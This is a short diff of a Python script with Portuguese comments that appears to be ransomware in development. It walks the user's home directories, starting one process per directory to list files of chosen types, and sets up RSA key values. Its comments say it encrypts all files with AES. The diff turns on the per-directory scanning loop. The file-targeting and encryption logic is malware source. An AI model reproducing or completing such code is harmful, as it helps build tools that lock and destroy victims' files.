@@ -36,6 +36,7 @@ texto='''
 
 '''
 
+# ponto de partida da criptografia
 def menu():
     # caminho de partida
     home=os.environ['HOME']
@@ -46,9 +47,9 @@ def menu():
     # diretorios no caminho de partida
     diretorios=os.listdir(home)
     tam=len(diretorios)
-    #for a in range(tam):
-    #    p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
-    #    p.start()
+    for a in range(tam):
+        p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
+        p.start()
         #p.join() -> em ordem # espera um terminar para começar outro
     listar('/home/tarcisio/.android',tipos,1)
     # CRIAR UMA THREAD PARA CADA DIRETORIO
@@ -119,7 +120,7 @@ serv_RSA=[1121,655]
 # gera_chaves_RSA.py
 valida()
 print('chaves publicas e privada do cliente geradas')
-
+#menu()
 
     # criptografa todos os arquivos com AES
 
